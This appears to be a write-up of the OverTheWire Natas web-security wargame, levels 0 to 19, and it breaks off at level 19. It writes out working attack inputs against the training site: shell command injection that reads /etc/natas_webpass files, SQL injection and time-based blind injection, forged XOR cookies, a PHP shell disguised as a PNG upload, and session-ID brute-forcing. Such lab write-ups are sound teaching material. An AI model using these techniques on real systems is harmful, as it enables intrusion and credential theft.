# Natas

## Level 00

Understand general workflow of the room. Natas war room does not use ssh like Bandit, instead it uses web pages. Each
webpage's URL is provided by the instructions. The goal is to find the password to the next room.

- Because this is the first room, the password is provided with the instructions.
- Follow the instructions to find the next room's password.

### Inspecting the page

The instructions for this game are vague, it only says to look for it on the website. If the user looks at the html for
the page, there is a line commented that looks like this:

```html
<!--The password for natas1 is PASSWORD_REDACTED -->
```

## Level 00 to Level 01

Using the password from the last room, the user can log in into the website. The instructions are the same, find the
next password somewhere in the webpage.

- Inspect the page.
- Find the password.

### Force inspect element on page

The website has blocked the use of right click. In order to enter devtools the user can use the key F12. Then, the only
thing left is to find the password in the html.

## Level 01 to Level 02

Use credentials to log in and inspect the html.

- Inspect the page.
- Find the password.

### Image manipulation

The html does not contain a comment with the password. Instead, it contains an image that has a size of 1 px by 1 px.
After following the resource of the image, the user should take a look at the url:

```html
http://natas2.natas.labs.overthewire.org/files/pixel.png
```

The `files` directory can contain some extra resources other than the image. After changing the URL to view that
directory, the user will find another resource, a text file. This text file contains the password for the next room.

## Level 02 to Level 03

Same as always, inspect the page and find the password.

- Inspect the page.
- Find the password.

### Web crawlers

The key to this room is to pay attention to the comment left on the html:

```html

<div id="content">
    There is nothing on this page
    <!-- No more information leaks!! 
    Not even Google will find it this time... -->
</div>
```

The part that talks about Google it's a hint about a specific technology called web crawlers (aka web spiders or web
robots).

<tldr>
    <p>
        Scripts or programs that systematically browse and retrieve information from the web.
    </p>
</tldr>

There is a convention that users follow to guide these crawlers, mainly for providing information about what sites the
crawlers cannot index. The convention is to provide these guidelines in a file called `robots.txt`, in the root of the
page. In this particular case it will be:

```html
http://natas3.natas.labs.overthewire.org/robots.txt
```

There the user can see what parts of the website the creator don't want indexed by crawlers. Going there will give the
user the password.

## Level 03 to Level 04

This room forces the user into understanding basic http requests.

- Understand how the page works and what it wants the user to do.
- Understand how http requests work.
- Intercept the request and change the correct things to get the password.

### Intercept http request

This page welcomes the user with a message saying:

```text
Access disallowed. 
You are visiting from "http://natas4.natas.labs.overthewire.org/" 
while authorized users should come only from 
"http://natas5.natas.labs.overthewire.org/"
```

The user has to make use of the program Burp Suite to intercept the http request and change the host.

If the user starts the interceptor and refreshes the website, the request will look like this:

<code-block lang="http" src="otw/natas/03-04.get.http"/>

The relevant value here is the `Referer`, if the user changes it accordingly to what the page wants, the password will
appear.

## Level 04 to Level 05

This time the page welcomes the user with a message that says it is not logged in.

- Inspect the website.
- Maybe intercept the request and inspect the headers.
- Find the password.

### Intercepting the request

If the user intercepts the http request, the information that it gets looks like this:

<code-block lang="http" src="otw/natas/04-05.get.http"/>

Modifying the value `loggedin` to `1` will allow the user to get the password after letting the request go.

## Level 05 to Level 06

This time the user is welcomed with a form, a single textbox asking for "input secret".

- Find how the page works and what it wants the user to do.
- Inspect the code using the button presented by the page.
- Somehow get the correct input secret or bypass the check.

### Logic behind the form

After inspecting the source code, a particular part of it stands out:

<code-block lang="php" src="otw/natas/04-05.index.php"/>

What does this code do?:

- `include "includes/secret.inc";`: imports the file that defines the value of `$secret`.
- `if(array_key_exists("submit", $_POST))`: checks if the user submitted the form.
- `if($secret == $_POST['secret'])`: check if the value imported earlier matches the one taken from the form
  named `secret`.

### Finding the password

If the user pays attention to the previous php snippet, the correct value for the secret comes from a file
called `secret.inc` in path `includes/`. Going to this location in the website:

```http
http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

Gives the user a blank page. But entering the developer tools (F12) or opening the source code view (CTRL+u) shows the
user the following:

```php
<?
$secret = "SECRET_REDACTED";
?>
```

Using this secret in the form will allow the user to get the password.

## Level 06 to Level 07

The page gives the user two links: home and about.

- Understand what the page wants the user to do.
- Inspect relevant information (html, source code, resources).
- Find the password.

### Inspection 06

Looking at the html, a particular comment stands out:

```html
<?--
hint: password for webuser natas8 is in /etc/natas_webpass/natas8 
-->
```

Trying out the home and about links show the user that the url changes:

```http
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

Changing the value of `page=` to something different gives the user the following message:

```text
Warning: include(test): failed to open stream: 
No such file or directory in /var/www/natas/natas7/index.php
```

### Getting the password for natas8

If the user remembers the comment in the html and the error message received while playing with the url, it will be no
surprise that combining both things will give result in the password:

```http
.../index.php?page=/etc/natas_webpass/natas8
```

## Level 07 to Level 08

This room welcomes the user with the same form as level 05 to 06.

- Inspect all resources.
- Understand what the page wants from the user.
- Get the password.

### Inspection 07

#### Source code

Inspection via <shortcut>CTRL+U</shortcut> gives no relevant information. Neither does devtools. Inspection via the link given by the page
has this relevant code snippet:

<code-block lang="php" src="otw/natas/07-08.index.php"/>

<tldr>
    <p>
        Encodes the secret using base64, reverses it and converts it from binary to hex.
    </p>
</tldr>

### Writing a decoder

With the logic of the encoding method, the user can easily write the inverse. Here is the python version:

```python
import base64, binascii

encoded_secret = "3d3d516343746d4d6d6c315669563362"
hex_decoded = binascii.unhexlify(encoded_secret)
reversed_str = hex_decoded[::-1]
secret = base64.b64decode(reversed_str).decode('utf-8')
print(secret)
```

Using the value given by the decoder will allow the user to get the next password.

## Level 08 to Level 09

This page welcomes the user with a form: "Find words containing".

- Test the form.
- Inspect the resources.
- Get the password.

### Testing form 08

It appears the form returns all the words that contain the text the user typed.

- It does not work with symbols.
- It does not work with numbers.
- It changes the value `needle=` in the URL.

### Inspection 08

The devtools and source view don't have any relevant information. Using the source code viewer provided by the page
gives the user the following relevant code:

<code-block lang="php" src="otw/natas/08-09.index.php"/>

Thoughts:

- The variable `$key` takes the value from the url, specifically from the `needle` param.
- The variable `$key` is used in a `grep` command with the *ignore case* flag.
- It looks like it takes the words from a file named `dictionary.txt`.

The file `dictionary.txt` can be inspected by:

```http
http://natas9.natas.labs.overthewire.org/dictionary.txt
```

### Research 08

- It appears the `passthru()` function in php is dangerous and normally should be disabled in `php.ini`.
- The usage of `passthru()` gives the user the chance to inject php code in the `needle=` param.

### PHP code injection 08

In a normal scenario the url looks like this:

```http
http://natas9.natas.labs.overthewire.org/?needle=example
```

To inject php code the user has to add semicolons `;` to "finish" the `grep` execution that runs on the server.

```http
http://natas9.natas.labs.overthewire.org/?needle=;ls;
```

The previous example runs `ls` on the server. The backend `grep` will end up looking like this:

```bash
grep -i ;ls; dictionary.txt
```

### Getting password for natas10

The user has to remember some information given by OverTheWire at the beginning:

> All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file
> /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

With this information and the power to inject php code, the user can easily get to that location and grab the password.

```http
.../?needle=;cat%20/etc/natas_webpass/natas10;
```

## Level 09 to Level 10

The page is similar to the last one. This time it has a new message that says "*For security reasons, we now filter on
certain characters*".

- Test the form.
- Inspect resources.
- Try injecting php code.
- Get the password.

### Inspection 09

The relevant information once again is given by the source viewer provided by the page:

<code-block lang="php" src="otw/natas/09-10.index.php"/>

Thoughts:

- It looks like now it checks for presence of semicolon and symbols used for code injection.
- Even though it checks for symbols, it's still using `passthru()`.

### PHP code injection 09

After some failed attempts, turns out the regex is unavoidable. So user will have to work with the fact that `$key` will
reach the `grep` as a regular string.

User can research about `grep`, tldr: it can accept multiple files as haystack.

```bash
grep -i NEEDLE HAYSTACK1 HAYSTACK2
```

With this information, the new strategy is now to use `grep` to user's benefit. User knows that no matter what one of
the files that `grep` is going to use as haystack is `dictionary.txt`, the other haystack could be the file that
contains the password for natas11:

```bash
grep -i SOMETHING /etc/natas_webpass/natas11 dictionary.txt
```

The last thing to do is to put some character that will match with the password, this is trial and error.

```bash
grep -i a /etc/natas_webpass/natas11 dictionary.txt
```

The input to the field would be this:

```text
a /etc/natas_webpass/natas11
```

If it matches the user will see in the output the password, plus the matches from `dictionary.txt`.

## Level 10 to Level 11

This page welcomes the user with a message saying that cookies are protected with XOR encryption and a form that wants a
color in hex code.

- Test form.
- Inspect resources.
- Understand the meaning of the message.
- Get the password.

### Testing form 10

It looks like the relevant information is the only cookie being stored. Here are some tests:

|  Color  |                           Cookie                           |
|:-------:|:----------------------------------------------------------:|
| #ffffff | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D |
| #111111 | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GdWZeVHVmTRg%3D |
| #AAAAAA | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GBRYuJAUWTRg%3D |
| #D1AB59 | HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GAGYuJ3FuTRg%3D |

The majority of the cookie stays the same, it looks like the color only affects this part:

```text
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1G[_-_-_-]TRg%3D
```

### Inspection 10

This time the php code available in the view source link provided has a fair amount of lines. The logic can be divided
into the following actions:

<code-block lang="php" src="otw/natas/10-11.index.php" include-lines="3-9"/>

#### Loading the data

The loading of the data takes place in the following function:

<code-block lang="php" src="otw/natas/10-11.index.php" include-lines="24-37"/>

<tldr>
    <list type="decimal">
        <li>There has to be a cookie named <code>data</code>.</li>
        <li>Decode the cookie with base64, encrypt it with <code>xor_encrypt</code> and decode it with <code>json</code>.</li>
        <li>If the result is an array with keys <code>bgcolor</code> and <code>showpassword</code> check if the color is valid.</li>
        <li>If the color is valid, updates the value of <code>bgcolor</code> and <code>showpassword</code>.</li>
    </list>
</tldr>

#### xor encryption

Here is the definition:

<code-block lang="php" src="otw/natas/10-11.index.php" include-lines="11-22"/>

#### Saving the data

The saving of the data follows this logic:

<code-block lang="php" src="otw/natas/10-11.index.php" include-lines="39-41"/>

### Resolution 10

#### Getting the key

The first thing to achieve is getting the value of the key. To do this, user should first focus on this particular line
of code from the `saveDate()` function:

```php
base64_encode(xor_encrypt(json_encode($d)))
```

User can separate the whole process into two sides that will eventually converge. See it like this:

```text
Cookie ==> base64_encode ==> xor_encrypt <== json_encode <== array()
```

Let's put an example. Consider the following scenario:

```php
$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
$arr = array("showpassword"=>"no","bgcolor"=>"#ffffff");
```

After applying the corresponding transformation for each one:

```php
$json_encode = '{"showpassword":"no","bgcolor":"#ffffff"}';
$base64_decode = "something non human readable";
```

Here the user has to stop and think about the xor operation. Following this example, making XOR between `{`
and `$key[0]` will result in `s`:

- `'"' ^ $key[1] = 'o'`
- `'s' ^ $key[2] = 'm'`
- And so on.

Considering that the XOR transformation applied twice returns the original (in other words, the opposite of the
operation is just applying it again). User can algebraically manipulate the previous operation into getting the value of
a particular index of `$key`. Like this:

- `$key[0] = '{' ^ 's'`
- `$key[1] = '"' ^ 'o'`

With this information, user can create a quick PHP script that cracks the key:

<code-block lang="php" src="otw/natas/10-11.resolution.php" include-lines="1-11"/>

The output will be:

```text
eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

Considering the repetitions, the key should be `eDWo`. A quick way to check if the value is correct:

First, change the value of `$key` in the encryptor:

<compare type="left-right">
<code-block lang="php"> 
    function xor_encrypt($in) {
        $key = '&lt;censored&gt;';
        // ...
    }
</code-block>
<code-block lang="php">
    function xor_encrypt($in) {
        $key = 'eDWo';
        // ...
    }
</code-block>
</compare>

Then, cycle through the transformations until reaching the middle and compare values:

<code-block lang="php" src="otw/natas/10-11.resolution.php" include-lines="13-22"/>

#### Getting the correct cookie

With the key, the user can now easily traverse the `loadData()` process backwards in order to get the correct cookie.

1. Creating the array that will end up showing the password.
2. Encode with json.
3. Encrypt with XOR.
4. Encode with base64.

<code-block lang="php" src="otw/natas/10-11.resolution.php" include-lines="24-29"/>

With the cookie the user can make use of it either with Burp Suite or with devtools and grab the password.

## Level 11 to Level 12

This time the user is welcomed with the instructions of uploading a `.jpeg` of up to 1KB. The page provides two buttons:
one for browsing the filesystem and other for uploading the file.

- Test the uploader.
- Inspect the resources.
- Find what needs to be done.
- Get the password.

### Testing the uploader 11

- Not uploading anything shows an error.
- Uploading any file changes its name and forces its extension to `.jpg`.
- The uploaded file can be seen following the provided link. The resource is at `/upload/new_name.jpg`.

### Inspection 11

#### HTML inspection 11

The html inspection shows two odd lines with `type="hidden`:

```html
<input type="hidden" name="MAX_FILE_SIZE" value="1000">
<input type="hidden" name="filename" value="8cu5lximjb.jpg">
```

The `.jpg` changes each time the user refreshes the page.

#### PHP inspection 11

The PHP inspection shows, as usual, a fair amount of functions. The flow of execution looks something like:

1. Checks if superglobal `$_POST` contains the key `filename`.
2. If it does not contain that key, it randomly generates a filename with extension `.jpg` as seen previously.
3. If it contains that key, randomly generates a path using multiple functions. It ends up looking
   like `upload/random_string.filename_ext`.
4. If file isn't too big and passes `move_uploaded_file()` the file gets uploaded.

### Random path creation logic

The path creation uses 3 functions:

<tabs>
    <tab title="genRandomString">
        <code-block lang="php" src="otw/natas/11-12.index.php" include-lines="3-13"/>
        <tip>
            Generates a string of length 10, using lowercase letters and numbers.
        </tip>
    </tab>
    <tab title="makeRandomPath">
        <code-block lang="php" src="otw/natas/11-12.index.php" include-lines="15-21"/>
        <tip>
            Generates a path that follows this format: <path>$dir/random_string.$ext</path> while file doesn't exist.
        </tip>
    </tab>
    <tab title="makeRandomPathFromFilename">
        <code-block lang="php" src="otw/natas/11-12.index.php" include-lines="23-26"/>
        <note>
            The file given as parameter is only used for its extension. The function <code>pathinfo</code> with the option <code>PATHINFO_EXTENSION</code> ignores everything except the extension.
        </note>
        <tip>
            The function returns a path that follows the format <path>$dir/random_string/$ext</path>
        </tip>
    </tab>
</tabs>

### Resolution 11

Taking into consideration that no matter what file the user uploads it always ends up being a `.jpg`, and remembering
that the only place this is defined is in the html, the user can try manipulating this resource on the frontend to see
what happens.

```html
<input type="hidden" name="filename" value="t2sgjbtabr.php">
```

After submitting the user gets a message that says:

> The file `upload/96omfk74zs.php` has been uploaded.

And following the link opens the file and interpretes the php code inside. With this information, the user can write the
following:

<code-block lang="php" src="otw/natas/11-12.resolution.php" include-lines="3,4"/>

Thoughts:

- `$out`: gets the result of running the shell command.
- `echo ...`: makes it visible on the web page.

## Level 12 to Level 13

The website looks almost like the previous one, the only difference is that this time it has a message saying it only
accepts image files.

- Test the uploader.
- Inspect the resources.
- Get the password.

### Testing the uploader 12

- Uploading a php file doesn't seem to work.
- Changing the file extension on the html doesn't work either.

### Inspection 12

#### HTML inspection 12

The html doesn't seem to contain relevant information. Changing the file extension there does not affect how the backend
gets the file.

#### PHP inspection 12

There seems to be the same functions as previous room.

- `getRandomString()`: has the same implementation.
- `makeRandomPath($dir, $ext)`: has the same implementation.
- `makeRandomPathFromFilename($dir, $fn)`: has the same implementation.

What changes is the implementation of the `if` statement that comes before the `move_uploaded_file()`:

<code-block lang="php" src="otw/natas/12-13.index.php" include-lines="3-15"/>

This particular statement is in charge of blocking the user uploads if the file is not an image:

<code-block lang="php" src="otw/natas/12-13.index.php" include-lines="11-13"/>

After doing some research about that function, what ended up catching my attention was this:

> `exif_imagetype()` reads the first bytes of an image and checks its signature.

A possible strategy could be changing the first bytes of the `.php` file and tricking the function into considering an
image.

### Resolution 12

#### More info about `exif_imagetype` and how to bypass it

Doing more research about the `exif_imagetype()` function gave me the following info:

- In order to determine if a file is an image, **it reads the first 8 bytes**.
- The logic behind the functions does not care about the file extension.
- The algorithm checks for a valid image data in addition to the headers.

Some examples of the first bytes:

| TYPE |           BYTES           |      ASCII       |
|:----:|:-------------------------:|:----------------:|
| JPEG |        `FF D8 FF`         |      `ÿØÿ`       |
| PNG  | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG\r\n\x1A\n` |
| GIF  |       `47 49 46 38`       |      `GIF8`      |

#### Masking the PHP file

Steps to follow:

1. Add image headers.
2. Add valid image data.
3. Append the php code.
4. Test it.

Final product:

<code-block lang="php" src="otw/natas/12-13.resolution.php" include-lines="3-28"/>

#### Testing the fake image on the website

It works:

<code-block lang="html">
The file `upload/4emxs1rgq2.php` has been uploaded.
</code-block>

And the execution shows:

```html
�PNG  IHDR���IDATx�c```This is a PHP file.
```

#### Adding the real code

Lastly, change the php code to look for natas14's password.

<compare type="top-bottom">
    <code-block lang="php" src="otw/natas/12-13.resolution.php" include-lines="15-17"/>
    <code-block lang="php" src="otw/natas/12-13.resolution.php" include-lines="30-33"/>
</compare>

## Level 13 to Level 14

This time the page contains a form asking for user and password. It also contains the usual link that allows the user to
see a part of the source code.

- Try the form.
- Inspect the resources.
- Find end goal.
- Get the password.

### Testing form 13

Some basic tests:

- Blank submission: `Access denied!`.
- Blank user submission: `Access denied!`.
- Blank password submission: `Access denied!`.
- Random data: `Access denied!`.

### Inspection 13

#### HTML inspection 13

Relevant code:

<code-block lang="html" src="otw/natas/13-14.index.html" />

#### Request inspection 13

The requests pack the login data like this:

```http
username=testuser&password=testpassword
```

#### PHP inspection 13

The code that handles the authentication:

<code-block lang="php" src="otw/natas/13-14.index.php" include-lines="3-20" collapsible="true" collapsed-title="index.php"/>

Thoughts:

- Opens a MySQL connection and selects natas14 database.
- The `$query` variable contains the query.
- **If the result of the query has more than 0 rows it shows the password.**

### Resolution 13

My first idea would be to try to inject SQL code into the form to "cancel" the `WHERE` clausule or make it `TRUE`
always. The SQL after inject has to perform this operation:

```sql
SELECT * FROM user
-- THE FOLLOWING WHERE SHOULD EVAL TO TRUE
WHERE username="something" AND password="something" 
```

Injecting an `OR TRUE` would make all statement result in true.

```sql
SELECT * FROM user 
WHERE username="something" AND password="something" OR TRUE
```

#### SQL injection

Considering the form works like this:

```text
Username: "Something"
Password: "Something else"
```

Selecting a password (could be username too) that looks like this:

```text
Username: ""OR TRUE--"
Password: "something"
```

Will make the SQL query something like this:

```sql
SELECT * FROM user
WHERE username=""OR TRUE-- AND password="something"
```

Sometimes (in this particular case too) the comment `--` won't work. For MySQL, a more reliable way is to use `#`
instead:

```text
Username: ""OR TRUE#"
Password: "something"
```

The SQL query:

<code-block lang="sql" src="otw/natas/13-14.resolution.sql"/>

## Level 14 to Level 15

This time the form only has a username field. There is an extra button that says "Check existence".

- Try the form.
- Inspect the resources.
- Find end goal.
- Get the password.

### Testing form 14

Tests:

- Basic tests show the same results as the previous login form.
- Injecting `"OR TRUE#`, shows user exists but no information regarding the password.
- User `natas16`, exists.

Thoughts:

- It seems it contains the usernames of all natas and maybe their passwords.
- It is still vulnerable to SQL injections.

### Inspection 14

#### HTML inspection 14

Relevant code:

<code-block lang="html" src="otw/natas/14-15.index.html"/>

#### PHP inspection 14

Relevant code:

<code-block lang="php" src="otw/natas/14-15.index.php" include-lines="1-18"/>

Thoughts:

- This time the password for the next level is not printed anywhere.
- There is a comment about the design of the table named `users`.

### Resolution 14

The plan is simple: considering the only information I get as response is if the user exists, I can brute force the
password by injecting a clause that checks for it, the end result should be this query:

```sql
SELECT * FROM users
WHERE username="username" AND password="something else";
```

#### Bruteforcing logic 14

Considering the following information about the password:

- Has length 32.
- Has lowercase and uppercase letters.
- Has numbers.

I can try each character and advance when I get a correct one, until it reaches 32 characters. The way of confirming if
a character is correct is with the `LIKE` operation in conjunction with `BINARY` to be case-sensitive.

```sql
SELECT * FROM users
WHERE username="username" AND BINARY password LIKE "chars%";
```

The code used to brute force this:

<code-block lang="generic" src="otw/natas/14-15.resolution.pl" collapsible="true" collapsed-title="natas14-15.pl"/>

Steps:

1. Defines the credentials and the logic of the web request, taking into consideration the credentials.
2. Defines a string with all lowercase, uppercase and numbers. In order to later use it to test char by char.
3. Set up the looping process for testing the chars, it should run until the goal string reaches the length constraints.
4. Test each char, injecting it into the SQL query.
5. Check if is valid by parsing the HTML output given as response. If it is, update the string that holds the final
   value.

## Level 15 to Level 16

The website is similar to the one in [Level 08 to Level 09](#level-08-to-level-09), it has only one form field with the
label "Find words containing". It also has the following message:

<code-block lang="html">
For security reasons, we now filter even more on certain characters.
</code-block>

And an output title that shows results as the user submits the form. Here go the general steps to follow:

- Test the form.
- Inspect the resources.
- Find out the vulnerability or strategy to use.
- Get the password.

### Testing form 15

Basic tests:

- Blank field gives nothing.
- Regular string or char gives the list of values that contain that string in them.
- The URL after submitting: `.../?needle=test&submit=Search`

### Inspection 15

The form seems to be using the same `dictionary.txt` as level 8 to 9 (or at least its own version). I can be inspected
in [dictionary.txt](http://natas16.natas.labs.overthewire.org/dictionary.txt).

#### HTML inspection 15

Nothing interesting.

#### PHP inspection 15

Exact same code as [Level 9 to 10](#inspection-09). Except this part:

<compare type="top-bottom" first-title="Current" second-title="Level 9 to 10">
    <code-block lang="php" src="otw/natas/15-16.index.php" include-lines="3-7"/>
    <code-block lang="php" src="otw/natas/09-10.index.php" include-lines="9-13"/>
</compare>

Thoughts:

- This time it checks for additional characters: backtick (`` ` ``), single quote (`'`) and double quote (`"`).
- There is another way of executing a command with characters not considered: `$(whoami)`. But this runs in a subshell,
  so at the end of the day `grep` will count it as a string.

```bash
grep -i "$(something)" dictionary.txt
```

### Resolution 15

Taking into consideration the vulnerability explained in the inspection. I can brute force the password by testing each
character, like the previous level.

Consider this input:

```bash
grep -i "$(cat /etc/natas_webpass/natas17)" dictionary.txt
```

The `grep` command will look for the password for natas17 in `dictionary.txt`. Of course this won't return anything. But
if instead of the whole password I test for just a part of it:

```bash
grep -i "$(grep a /etc/natas_webpass/natas17)" dictionary.txt
```

Here I first search for the string 'a' in the password. If it is on the password, the final command would look like:

```bash
grep -i THE_PASSWORD dictionary.txt
```

Which won't show result in a match considering `dictionary.txt` contains regular words. If the letter 'a' is not in the
password, the command would look like this:

```bash
grep -i "" dictionary.txt
```

Which will return the whole contents of `dictionary.txt`.

Using this knowledge the brute force operation will test char by char and confirm it by looking at the HTML output:

- If tested string is correct: **no list on the webpage**.
- If tested is not correct: **list on the webpage**.

To make things easier, instead of just sending the shell command, I can send a string I know exists on the dictionary.
Here goes an example:

```bash
grep -i "example" dictionary.txt
```

The file `dictionary.txt` has this words that match:

```text
counterexample
example
example's
exampled
examples
```

Let's go back to the injection, but this time using an exact word too:

<code-block lang="bash" src="otw/natas/15-16.resolution.sh"/>

This time:

- If the tested string is correct: **no list on the webpage**.
- If the tested string is not correct: ***counterexample* on the webpage**.

#### Bruteforcing 15

To not post the whole script, I will be posting only snippets of relevant parts.

<tabs>
    <tab title="Request handler">
        <code-block lang="generic" src="otw/natas/15-16.resolution.pl" include-lines="1-11"/>
        <tip>
            Since the website handles it as a `GET` request with parameters, I do the same.
        </tip>
    </tab>
    <tab title="Request setup">
        <code-block lang="generic" src="otw/natas/15-16.resolution.pl" include-lines="19-26"/>
        <tip>
            Since the value is sent via URL, the special characters have to be url-encoded.
        </tip>
    </tab>
    <tab title="Response handler">
        <code-block lang="generic" src="otw/natas/15-16.resolution.pl" include-lines="13-17"/>
        <tip>
            The parameter <code>$candidate</code> is an HTML response.
        </tip>
    </tab>
    <tab title="Bruteforce operation">
        <code-block lang="generic" src="otw/natas/15-16.resolution.pl" include-lines="28-46"/>
        <note>
            Given how <code>grep</code> is being used, the tested character could be at the beginning or the end of the password. That's why the checker runs 2 times.
        </note>
    </tab>
</tabs>

## Level 16 to Level 17

It appears to be the same website as [Level 14 to Level 15](#level-14-to-level-15). The form looks the same.

- Test the form.
- Inspect resources.
- Find vulnerability and understand how to abuse it.
- Get the password.

### Testing form 16

Some basic tests:

- Blank data: shows a blank page.
- Regular data: shows a blank page.

### Inspection 16

#### HTML inspection 16

Nothing interesting.

#### PHP inspection 16

It looks like the same code as [level 14 to 15](#php-inspection-14). The only difference is that, this time, the `echo`
statement that printed the result of the SQL query, is commented:

<code-block lang="php" src="otw/natas/16-17.index.php" include-lines="3-23"/>

### Resolution 16

The first thing is to understand the problem. The SQL injection vulnerability still exists, the problem is that I don't
have any apparent way of checking the result on the website.

A key focus is to understand that the website **is still** vulnerable to SQL. So, I can use SQL code to kind of "give me
a hint" on the frontend if what I am trying is correct.

One way of doing this is with the `SLEEP` command. It pauses the serving of the response an X amount of seconds.
I can use this to confirm if the brute force operation is correct or not.

<tldr>
    <p>Response takes too long: something</p>
    <p>Response is fast: something else</p>
</tldr>

#### Overview of the SQL injection 16

The SQL code that will eventually run on the server:

<code-block lang="sql" src="otw/natas/16-17.resolution.sql"/>

#### Bruteforcing 16

They key factor is the comparison between the response times. First I define a function that calculates it:

<code-block lang="generic" src="otw/natas/16-17.resolution.pl" include-lines="1-9"/>

- For this particular scenario it's not necessary to be that precise, so Perl's own `time()` is enough. For other cases
  consider: `use Time::HiRes qw(time);`.

Then I use it in the brute force operation:

<code-block lang="generic" src="otw/natas/16-17.resolution.pl" include-lines="11-25"/>

<tip>The sleep time of 5 seconds is enough to tell the difference.</tip>

## Level 17 to Level 18

The website contains a form with username and password fields. When logging in, sets up a cookie, locking the user to
that account, hiding the login form.

- Test the form.
- Play with the cookie.
- Inspect resources.
- Find the vulnerability and understand how to abuse it.
- Get the password.

### Test form 17

Basic tests:

- Not providing any value and submitting logs in the user regardless.
- There seems to be only two valid user groups: regular and admin.
- Trying to reload the page after logging in forces the login details to be sent again.

### Inspection 17

#### HTML inspection 17

Nothing interesting.

#### HTTP inspection 17

The first GET request doesn't seem to contain any relevant information. The POST request has the following body:

```http
username=example&password=example
```

The cookie that the login sets up:

|  Cookie   | Value |
|:---------:|:-----:|
| PHPSESSID |  22   |

The value depends on the login information. On the PHP inspection shows that the max value is 640.

#### PHP inspection 17

Too much code. The tldr:

- Defines `$maxid = 640` and uses it to generate a random id up to that limit.
- The first thing it does regarding the session is confirming the existence of cookie `PHPSESSID`. If it doesn't exist,
  PHP creates it.
- It checks for the user that is currently in the session, if it's the admin, prints the password.

### Resolution 17

It is posible to send the cookie and its value in the headers. My first strategy is to bruteforce it.

#### Bruteforcing 17

<tabs>
    <tab title="Request handler">
        <code-block lang="generic" src="otw/natas/17-18.resolution.pl" include-lines="1-19"/>
        <tip>It sets up the cookie in the headers hash. The values of the body are irrelevant.</tip>
    </tab>
    <tab title="Bruteforce operation">
        <code-block lang="generic" src="otw/natas/17-18.resolution.pl" include-lines="21-31"/>
    </tab>
</tabs>

<tldr>
    <list type="decimal">
        <li>Define the total possible values (1 to 640).</li>
        <li>Make the request with the current value in iteration as the cookie.</li>
        <li>If the html response contains the phrase <emphasis>"You are an admin"</emphasis>, the cookie was correct.</li>
        <li>When the correct cookie is found, prints the password.</li>
        <li>(OPTIONAL) to display only the password and not the whole html, parse it with a regex. Focus on the print format defined in the PHP file and the fact that all passwords are length 32.</li>
    </list>
</tldr>

## Level 18 to Level 19

Same page as the previous level, this time it has additional information:

> This page uses mostly the same code as the previous level, but session IDs are no longer sequential.

The general plan to follow:

- Test the form.
- Inspect the resources, focusing on the cookies.
- Understand the vulnerability and how to exploit it.
- Get the password.

### Testing form 18

It works the same as the one from the previous level.

### Inspection 18

The focus of the inspection should be on the cookie set up by PHP.

#### Cookie inspection 18

Giving the form the following data:

```text
Username: natas20
Password:
```

Produces the following cookie:

```http
PHPSESSID=3133362d6e617461733230
```

Some extra tests:

| Username | Password |       PHPSESSID        |
|:--------:|:--------:|:----------------------:|
|          |          |        3535372d        |
|  admin   |          |   3436332d61646d696e   |
|          |  admin   |        3234372d        |
|          | natas20  |        3437332d        |
| natas20  | natas20  | 3539322d6e617461733230 |
|  natas   |  natas   |    31362d6e61746173    |
| natas20  |          | 3137312d6e617461733230 |

By studying the results, I found that the username defines the part after the character `d`, and that stays constant.
Running the form three times with username natas20:

| Username | Password |       PHPSESSID        |
|:--------:|:--------:|:----------------------:|
| natas20  |          |  34322d6e617461733230  |
| natas20  |          | 3232342d6e617461733230 |
| natas20  |          | 3236322d6e617461733230 |

So it seems that `6e617461733230` corresponds to `natas20`. It is also important to understand the meaning of the
character `d`, as it appears in all results. In **hexadecimal** the letter 'd' corresponds to `-`. Giving all session
ids the following format:

```Generic
MAYBE_RANDOM_TEXT-natas20
```

With the new knowledge of the encoding method, let's run some extra tests:

| Username | Password | HEX Decoded Cookie |
|:--------:|:--------:|:------------------:|
| natas20  | natas20  |    465-natas20     |
| natas20  |          |    555-natas20     |
| natas20  | natas20  |    278-natas20     |

It looks like the id used for the bruteforce operation in the previous level it still there, but this time encoded with
the username.

### Resolution 18

With the information collected in the cookie inspection process, the strategy becomes really clear:

- Hex encode something that follows this format: `number-admin`. Because the admin's name is `admin`, not `natas20`.
- Bruteforce the `number` part, maybe considering the max limit of 640 set on previous level.
- Parse the html response to confirm the result.

#### Bruteforcing 18

<tabs>
    <tab title="Request handler">
        <code-block lang="shell" src="otw/natas/18-19.resolution.ps1" include-lines="1-21"/>
    </tab>
    <tab title="Bruteforce operation">
        <code-block lang="shell" src="otw/natas/18-19.resolution.ps1" include-lines="23-32"/>
    </tab>
</tabs>

<tldr>
    <list type="decimal">
        <li>Hex encodes the string <code>ITER_NUMBER-admin</code>.</li>
        <li>Makes the request, using the hex string as cookie.</li>
        <li>If the response contains the string <emphasis>"You are an admin"</emphasis>. Uses a regex to extract the password and stops execution.</li>
    </list>
</tldr>

## Level 19 to Level 20

At first sight it appears to be another challenge related to cookies. This time it immediately logs the user
as `regular user`. The form has only one field `Your name` and a button `Change name`.

- Test the form.
- Inspect the resources. Focus on the cookie and the PHP code (provided by the page this time).
- Find the vulnerability and understand how to exploit it.
- Get the password.

### Testing form 19

Some basic tests:

| Your name |         PHPSESSID          |
|:---------:|:--------------------------:|
|   test    | eu0u0qlovt5iqhecvvo8ve9orm |
|   natas   | ulgghj97fbir2qvtomr4p2nino |
|   test    | u58moldlddcgo6i1krurpkd34i |
|   natas   | 381h2ghbibi6bm4fha16rojo2t |

Thoughts:

- To make the cookie change I had to delete it. The submission of the form doesn't seem to affect it if it is already
  set.
- There is some randomness, trying the same input after deleting the cookie give a different result.
- Cookies for the same name don't seem to have anything in common.

### Inspection 19

#### Cookie inspection 19

